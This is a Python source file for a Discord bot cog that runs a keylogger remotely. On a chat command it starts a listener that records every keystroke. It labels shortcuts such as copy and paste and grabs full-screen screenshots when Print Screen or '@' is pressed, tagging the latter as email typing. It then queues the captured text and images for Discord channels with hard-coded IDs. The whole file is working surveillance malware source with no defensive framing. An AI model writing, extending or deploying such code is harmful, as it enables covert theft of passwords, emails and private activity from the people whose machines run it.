import discord
from discord.ext import commands
from pynput.keyboard import Key, Listener
from PIL import ImageGrab
import datetime

class KeyloggerCog(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.files_to_send = []
        self.messages_to_send = []
        self.embeds_to_send = []
        self.text_buffor = ''
        self.ctrl_codes = {
            '<ctrl>+c': 'Copy',
            '<ctrl>+v': 'Paste',
            '<ctrl>+x': 'Cut',
            '<ctrl>+z': 'Undo',
            '<ctrl>+y': 'Redo'
        }
        self.channel_ids = {
            'main': 1251824707301408853,  # Replace with actual channel ID
            'spam': 1259815698197123215   # Replace with actual spam channel ID
        }
        self.listener = None

    def on_press(self, key):
        processed_key = str(key)[1:-1] if (str(key)[0] == '\'' and str(key)[-1] == '\'') else key

        keycodes = {
            Key.space: ' ',
            Key.shift: ' *`SHIFT`*',
            Key.tab: ' *`TAB`*',
            Key.backspace: ' *`<`*',
            Key.esc: ' *`ESC`*',
            Key.caps_lock: ' *`CAPS LOCK`*',
            Key.f1: ' *`F1`*',
            Key.f2: ' *`F2`*',
            Key.f3: ' *`F3`*',
            Key.f4: ' *`F4`*',
            Key.f5: ' *`F5`*',
            Key.f6: ' *`F6`*',
            Key.f7: ' *`F7`*',
            Key.f8: ' *`F8`*',
            Key.f9: ' *`F9`*',
            Key.f10: ' *`F10`*',
            Key.f11: ' *`F11`*',
            Key.f12: ' *`F12`*',
        }

        if processed_key in self.ctrl_codes.keys():
            processed_key = ' `' + self.ctrl_codes[processed_key] + '`'

        if processed_key not in [Key.ctrl_l, Key.alt_gr, Key.left, Key.right, Key.up, Key.down, Key.delete, Key.alt_l, Key.shift_r]:
            for i in keycodes:
                if processed_key == i:
                    processed_key = keycodes[i]
            if processed_key == Key.enter:
                processed_key = ''
                self.messages_to_send.append([self.channel_ids['main'], self.text_buffor + ' *`ENTER`*'])
                self.text_buffor = ''
            elif processed_key == Key.print_screen or processed_key == '@':
                processed_key = ' *`Print Screen`*' if processed_key == Key.print_screen else '@'
                ImageGrab.grab(all_screens=True).save('ss.png')
                self.embeds_to_send.append([self.channel_ids['main'], self.current_time() + (' `[Print Screen pressed]`' if processed_key == ' *`Print Screen`*' else ' `[Email typing]`'), 'ss.png'])
        
            self.text_buffor += str(processed_key)
            if len(self.text_buffor) > 1975:
                if 'wwwww' in self.text_buffor or 'aaaaa' in self.text_buffor or 'sssss' in self.text_buffor or 'ddddd' in self.text_buffor:
                    self.messages_to_send.append([self.channel_ids['spam'], self.text_buffor])
                else:
                    self.messages_to_send.append([self.channel_ids['main'], self.text_buffor])
                self.text_buffor = ''

    def current_time(self):
        return datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    @commands.command(name="start_keylogger")
    async def start_keylogger(self, ctx):
        if ctx is None:
            print("Error: ctx is None")
            return
        
        if self.listener is None:
            self.listener = Listener(on_press=self.on_press)
            self.listener.start()
            await ctx.send("Keylogger started!")
        else:
            await ctx.send("Keylogger is already running!")

    @commands.command(name="stop_keylogger")
    async def stop_keylogger(self, ctx):
        if ctx is None:
            print("Error: ctx is None")
            return
        
        if self.listener is not None:
            self.listener.stop()
            self.listener = None
            await ctx.send("Keylogger stopped!")
        else:
            await ctx.send("Keylogger is not running!")
            
async def setup(bot) -> None:
    await bot.add_cog(KeyloggerCog(bot))
